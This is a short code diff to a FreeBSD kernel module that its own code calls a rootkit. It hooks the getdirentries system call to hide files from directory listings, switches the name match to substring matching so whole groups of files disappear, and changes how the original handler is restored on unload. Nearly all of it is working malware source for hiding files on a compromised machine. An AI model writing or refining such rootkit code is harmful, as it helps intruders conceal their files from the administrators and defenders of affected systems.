@@ -36,7 +36,7 @@ static int custom_getdirentries(struct thread *td, void *args) {
 			count -= current->d_reclen;
 			// critical line right here, this is what matches and removes the filename
             // og line uses strstr to match anything with some standard naming convention string
-			if (strcmp(current->d_name, FILENAME)) {
+			if (strstr(current->d_name, FILENAME)) {
 				if (count != 0) {
 					bcopy((char *)current + current->d_reclen, current, count);
 				}
@@ -67,8 +67,8 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
         break;
     case MOD_UNLOAD:
         printf("Goodbye, Kernel!\n");
-        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-        // sysent[SYS_getdirentries].sy_call = original_getdirentries;
+        // sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+        sysent[SYS_getdirentries].sy_call = original_getdirentries;
         break;
     default:
         return EOPNOTSUPP;  // Unsupported operation
